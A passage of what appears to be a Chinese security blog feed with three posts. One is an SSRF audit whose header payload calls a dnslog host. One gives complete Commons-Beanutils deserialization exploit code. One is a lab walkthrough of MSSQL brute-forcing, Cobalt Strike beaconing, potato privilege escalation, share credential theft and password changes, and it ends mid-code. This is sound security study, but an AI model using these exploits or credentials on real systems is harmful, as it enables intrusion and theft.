alt="image">​</p><p>在这个代码里头，可以发现 <code>$count</code>​  跟 <code>$listJson</code>​ 是关键</p><p><code>$count</code>​的设置是为了不频繁查询，所以这里只要设置随机伪造的PHPSESSID就可以了</p><p><code>$listJson</code>​ 的设置就尤为关键了 if (!$listJson) 这里的语句是 我的redis去查phone就是要查不到 为null才能执行下面的sql语句，所以phone就是要不存在的手机号才行，所以就直接随机phone就可以了，但是他在后续的代码中把这跟手机号给设置进了<code>redis</code>​中</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141431982.png" alt="image">​</p><p>所以必须要把这跟<code>phone</code>​随机化来绕<code>redis</code>​的缓存才能进行正常注入</p><p>‍</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>这里全局搜索<code>curl_exec(</code>​ emm感觉是这里 确实是可控的</p><p>\Application\Course\Controller\DocumentController.class.php</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141431107.png" alt="image">​</p><p>‍</p><p>从逻辑上来看</p><p><code>$_SERVER[&#39;HTTP_AUTHORIZATION&#39;]</code>​  跟 <code>$_SERVER[&#39;HTTP_X_OSS_PUB_KEY_URL&#39;]</code>​ 这两个值都得存在 他就不会进行403的跳转 那么这两个都是我们可控的只要在header头加入即可，之后就会将我们传入的base64编码的值进行解码后给到curl进行直接curl执行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">Authorization: Basic QWxhZGRpbjpPcGVuU2VzYW1l<br>X-Oss-Pub-Key-Url: aHR0cDovL2RxM2JlMC5kbnNsb2cuY24=<br></code></pre></td></tr></table></figure><p>远程测了一下也是完全没问题的</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141431262.png" alt="image">​​</p><p>加入后返回两百</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141431449.png" alt="image">​</p><p>最终也是测出了SSRF</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141431637.png" alt="image">​​</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全 - Commons-Beanutils链</title>
    <link href="/post/java-security-commons-beanutils-nqgk3.html"/>
    <url>/post/java-security-commons-beanutils-nqgk3.html</url>
    
    <content type="html"><![CDATA[<p>‍</p><h1 id="Commons-Beanutils"><a href="#Commons-Beanutils" class="headerlink" title="Commons-Beanutils"></a>Commons-Beanutils</h1><p>‍</p><p>这个包是对Java Bean进行加强的</p><p>依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-beanutils<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-beanutils<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.8.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="Java-Bean-类"><a href="#Java-Bean-类" class="headerlink" title="Java Bean 类"></a>Java Bean 类</h2><p>Java Bean是一种规范,准确的说是一种Java类的书写规范,满足以下条件的Java类可以称之为Java Bean</p><p>1、成员变量均使用private关键字进行修饰</p><p>2、提供构造方法(有参&#x2F;无参)</p><p>3、为每个成员变量提供set&#x2F;get方法</p><p>例如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> sid;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> sid, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.sid = sid;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setSid</span><span class="hljs-params">(<span class="hljs-type">int</span> sid)</span> &#123;<br>        <span class="hljs-built_in">this</span>.sid = sid;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getSid</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> sid;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 分别定义了空参/有参的构造函数,该类有三个成员变量均使用了private关键字修饰为私有,并为每个成员都提供了set/get方法,所以该类可以称为Java Bean类。</span><br><span class="hljs-comment">//  get/set方法的作用是，在对象的成员变量进行取值或赋值操作时提供了一个标准的接口</span><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141122553.png" alt="image">​</p><h2 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h2><p>而有了CB这个包，就可以用以下形式来直接动态获取值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(PropertyUtils.getProperty(student, <span class="hljs-string">&quot;name&quot;</span>));<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141122941.png" alt="image">​</p><p>这里断点进去看看是如何实现传入<code>name</code>​就调用<code>getName</code>​方法的</p><p>进去后发现会去调用<code>getNestedProperty</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141122129.png" alt="image">​</p><p>跟进后发现他是去判断我们传入的类是什么类型的，如果都不属于下图中类就调用<code>getSimpleProperty</code>​方法</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141122256.png" alt="image">​</p><p>然后也是进去一系列判断如果都不属于这些类就调用<code>getPropertyDescriptor</code>​方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141122412.png" alt="image">​</p><p>而这个就是重点方法了，这里其实不需要去看他怎么实现的，他会返回<code>PropertyDescriptor类</code>​我们直接看他返回的对象<code>descriptor</code>​即可</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141122572.png" alt="image">​</p><p>可以发现他返回了几个属性，恰好就是setter getter方法名字</p><p>再接着往下就是获取方法的名字，然后去调用641行的反射</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141122727.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141122912.png" alt="image">​</p><p>所以到这里我们又可以想象<code>Fastjson</code>​一样，假设谁的 <code>PropertyUtils.getProperty</code>​ 传参是可控的，那么找到一个函数的 getter 是有危险行为的，那么通过CB链就可以去触发导致代码执行(而在Fastjson中也是有这种情况发生，所以后半段恶意类加载就可以利用<code>TemplatesImpl</code>​链来完成)</p><p>我们可以来写一个demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span>  templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\Java_project\\Serialization_Learing\\target\\classes\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">facField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        facField.setAccessible(<span class="hljs-literal">true</span>);<br>        facField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        templates.newTransformer();<br>        System.out.println(PropertyUtils.getProperty(templates, <span class="hljs-string">&quot;outputProperties&quot;</span>));<br></code></pre></td></tr></table></figure><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141122040.png" alt="image">​</p><p>那么现在已经后半条链已经衔接好了，现在就是去找jdk跟CB依赖中进行衔接的反序列化点</p><p>也就是去找谁去调用了<code>getProperty</code>​方法</p><p>‍</p><p>于是找到了 <code>commons-beanutils-1.8.3.jar!\org\apache\commons\beanutils\BeanComparator#compare()</code>​方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141122243.png" alt="image">​</p><p>这写法跟CC4的太像了真的，所以找到<code>compare()</code>​就可以联想到CC4的入口直接拼起来就可以串起来了</p><p>其实在这里我一直有个疑问，就是这个<code>compare()</code>​到底是否可控，因为他传两个参数我并不知道是在哪里可以控制的，调试了下也明白了，如下图</p><p>可以发现在721行是将<code>x</code>​传入，那么<code>x</code>​怎么进来的呢？</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141122463.png" alt="image">​</p><p>在上一个方法中就把<code>x</code>​传进来了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141122652.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141122774.png" alt="image">​</p><p>在<code>heapify</code>​中就传了对象，再往上跟就是<code>readObject</code>​了，而在<code>heapify</code>​中进行了数组的右移所以可以寻找到该属性通过 <code>priorityQueue.add(templates);</code>​传入的类,如果我们传入 <code>3</code>​ 就会不一样了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141122943.png" alt="image">​</p><p>就会变成数字类<code>3</code>​ 这也就是为什么我们队列这里要写入<code>TemplatesImpl</code>​类，这样子才能去调用到<code>TemplatesImpl</code>​类的getter方法</p><p>‍</p><p>那么直接写EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span>  templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\Java_project\\Serialization_Learing\\target\\classes\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-comment">// CB</span><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br><br>        <span class="hljs-comment">//CC2</span><br>        <span class="hljs-type">TransformingComparator</span>  <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(transformingComparator);<br><br>        priorityQueue.add(templates);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> priorityQueue.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">comfield</span> <span class="hljs-operator">=</span>  c.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comfield.setAccessible(<span class="hljs-literal">true</span>);<br>        comfield.set(priorityQueue,beanComparator);<br><br><br><br>        serialize(priorityQueue);<br></code></pre></td></tr></table></figure><p>CB的时候要生成CC跟CB都有的类，以下是组长整理的</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141122073.png" alt="image">​</p><p>‍</p><p>流程图</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141122231.png" alt="image">​</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>打靶 - 春秋云境 -  Tsclient</title>
    <link href="/post/spring-and-autumn-clouds-tsclient-z1fb7zo.html"/>
    <url>/post/spring-and-autumn-clouds-tsclient-z1fb7zo.html</url>
    
    <content type="html"><![CDATA[<p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446591.png" alt="image">​</p><p>‍</p><h3 id="Mssql"><a href="#Mssql" class="headerlink" title="Mssql"></a>Mssql</h3><p>扫全端口发现爆出Mssql的弱口令直接上提权工具执行命令</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446934.png" alt="image">​</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">[+] [brute] sqlserver 39.98.124.158 1433 sa 1qaz!QAZ<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446169.png" alt="image">​</p><p>‍</p><p>Powershell一句话上线CS</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446305.png" alt="image">​</p><p>‍</p><h3 id="烂土豆提权"><a href="#烂土豆提权" class="headerlink" title="烂土豆提权"></a>烂土豆提权</h3><p>CS自带的提权工具都不行，测试传了一个<code>SweetPotato</code>​发现缺成功了，真奇怪</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446526.png" alt="image">​</p><p>确实离谱，传个马上去利用system再次执行一遍即可成功上线system</p><p>‍</p><p>查看IP</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446683.png" alt="image">​</p><p>查看用户</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446808.png" alt="image">​</p><p>加了个用户进RDP拿到第一个flag</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446938.png" alt="image">​</p><p>‍</p><p>上传fscan打C段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">[=] Load Success<br>[=] icmp alive<br>[=] dial ip4:icmp 127.0.0.1: socket: An attempt was made to access a socket <span class="hljs-keyword">in</span> a way forbidden by its access permissions.<br>[=] IP: 172.22.8.15 alive<br>[=] IP: 172.22.8.31 alive<br>[=] IP: 172.22.8.18 alive<br>[=] IP: 172.22.8.46 alive<br>[=] 执行时间:3.61037s<br>[=] =========================<br>[=] 172.22.8.15:139 open NetBiosFile<br>[=] 172.22.8.15:445 open smb<br>[=] 172.22.8.15<br>  [&gt;] DC01            Workstation Service<br>  [&gt;] XIAORANG        Domain Name<br>  [&gt;] XIAORANG        Domain Controllers<br>  [&gt;] DC01            Server Service<br>  [&gt;] XIAORANG        Domain Master Browser<br>[=] 172.22.8.31:445 open smb<br>[=] 172.22.8.31:139 open NetBiosFile<br>[=] 172.22.8.31<br>  [&gt;] WIN19-CLIENT    Workstation Service<br>  [&gt;] XIAORANG        Domain Name<br>  [&gt;] WIN19-CLIENT    Server Service<br>[=] 172.22.8.15:88 open unknown/tcp<br>[=] 172.22.8.18:80 open http<br>[=] [web] http://172.22.8.18:80 | [IIS Windows Server] | [len:703] | [code:200] | [finger: Microsoft IIS | ]<br>[=] 172.22.8.18:445 open smb<br>[=] 172.22.8.18:139 open NetBiosFile<br>[=] 172.22.8.46:80 open http<br>[=] [web] http://172.22.8.46:80 | [IIS Windows Server] | [len:703] | [code:200] | [finger: Microsoft IIS | ]<br>[=] 172.22.8.46:445 open smb<br>[=] 172.22.8.46:139 open NetBiosFile<br>[=] 172.22.8.46<br>  [&gt;] XIAORANG        Domain Name<br>  [&gt;] WIN2016         Workstation Service<br>  [&gt;] WIN2016         Server Service<br>[=] 172.22.8.15:135 open rpc<br>[=] 172.22.8.15:53 open dns<br>[=] 172.22.8.15:3389 open tls/rdp<br>[=] 172.22.8.18:1433 open mssql<br>[=] 172.22.8.31:135 open rpc<br>[=] 172.22.8.31:3389 open tls/rdp<br>[+] [brute] sqlserver 172.22.8.18 1433 sa 1qaz!QAZ<br>[=] 172.22.8.18:135 open rpc<br>[=] 172.22.8.46:135 open rpc<br>[=] 172.22.8.18:3389 open tls/rdp<br>[=] 172.22.8.46:3389 open tls/rdp<br>[=] end......<br></code></pre></td></tr></table></figure><p>那么从上面来看是存在域的，并且存货的IP为</p><ul><li><p>172.22.8.31 域内主机</p></li><li><p>172.22.8.46 域内主机</p></li><li><p>172.22.8.15 DC</p></li></ul><h3 id="共享服务"><a href="#共享服务" class="headerlink" title="共享服务"></a>共享服务</h3><p>那么现在就是打域内主机，回想到之前是看到有一个特殊用户<code>john</code>​的(既然给了用户肯定有他的作用)而且在上面的扫描工具当中发现本机开放了445跟139端口，猜测存在共享服务</p><p>所以就是去在CS上以其他用户上线进行进程注入</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446074.png" alt="image">​</p><p>成功上线后查看一下共享服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">net use<br><span class="hljs-built_in">dir</span> \\TSCLIENT\C<br><span class="hljs-built_in">type</span> \\TSCLIENT\C\credential.txt<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446250.png" alt="image">​</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446373.png" alt="image">​</p><p>发现给了一个域内用户密码，那么又因为刚才扫到是都开放了3389，则上代理去连域内主机的RDP即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">xiaorang.lab\Aldrich:Ald@rLMWuy7Z!<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>发现说是密码过期要更新密码</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446499.png" alt="image">​</p><p>那只能上cmb去密码喷射了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446623.png" alt="image">​</p><p>发现SMB也是密码过期，于是可以使用smb去修改密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains python3 smbpasswd.py xiaorang.lab/Aldrich:<span class="hljs-string">&#x27;Ald@rLMWuy7Z!#&#x27;</span>@172.22.8.15 -newpass <span class="hljs-string">&#x27;admin@123&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446768.png" alt="image">​</p><h3 id="Smb修改密码"><a href="#Smb修改密码" class="headerlink" title="Smb修改密码"></a>Smb修改密码</h3><p>那么重新去登录一遍</p><p>发现直接登录DC是不可行的(可行都起飞了)</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446909.png" alt="image">​</p><p>‍</p><p>172.22.8.31</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446015.png" alt="image">​</p><p>‍</p><p>发现172.22.8.46是可以登录进去的，由于还需要横两台主机，所以在这里先进行转发上线</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446147.png" alt="image">​</p><h3 id="放大镜提权"><a href="#放大镜提权" class="headerlink" title="放大镜提权"></a>放大镜提权</h3><p>上线后尝试了一下常规提权想抓取hash，但是都失败了，后续看了一下别人的wp，发现这里用到的是<code>放大镜提权</code>​</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">get-acl</span> <span class="hljs-literal">-path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot;</span> | <span class="hljs-built_in">fl</span> *<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">PS C:\Users\Aldrich\Desktop&gt; get-acl -path <span class="hljs-string">&quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Opti</span><br><span class="hljs-string">ons&quot;</span> | fl *<br><br><br>PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentV<br>                          ersion\Image File Execution Options<br>PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentV<br>                          ersion<br>PSChildName             : Image File Execution Options<br>PSDrive                 : HKLM<br>PSProvider              : Microsoft.PowerShell.Core\Registry<br>CentralAccessPolicyId   :<br>CentralAccessPolicyName :<br>Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentV<br>                          ersion\Image File Execution Options<br>Owner                   : NT AUTHORITY\SYSTEM<br>Group                   : NT AUTHORITY\SYSTEM<br>Access                  : &#123;System.Security.AccessControl.RegistryAccessRule, System.Security.AccessControl.RegistryAcce<br>                          ssRule, System.Security.AccessControl.RegistryAccessRule, System.Security.AccessControl.Regis<br>                          tryAccessRule...&#125;<br>Sddl                    : O:SYG:SYD:PAI(A;CIIO;KA;;;CO)(A;CI;CCDCLCSWRPRC;;;AU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)(A;CI;KR;;;B<br>                          U)(A;CI;KR;;;AC)<br>AccessToString          : CREATOR OWNER Allow  FullControl<br>                          NT AUTHORITY\Authenticated Users Allow  SetValue, CreateSubKey, ReadKey<br>                          NT AUTHORITY\SYSTEM Allow  FullControl<br>                          BUILTIN\Administrators Allow  FullControl<br>                          BUILTIN\Users Allow  ReadKey<br>                          APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey<br>AuditToString           :<br>AccessRightType         : System.Security.AccessControl.RegistryRights<br>AccessRuleType          : System.Security.AccessControl.RegistryAccessRule<br>AuditRuleType           : System.Security.AccessControl.RegistryAuditRule<br>AreAccessRulesProtected : True<br>AreAuditRulesProtected  : False<br>AreAccessRulesCanonical : True<br>AreAuditRulesCanonical  : True<br></code></pre></td></tr></table></figure><p>重点关注这个内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 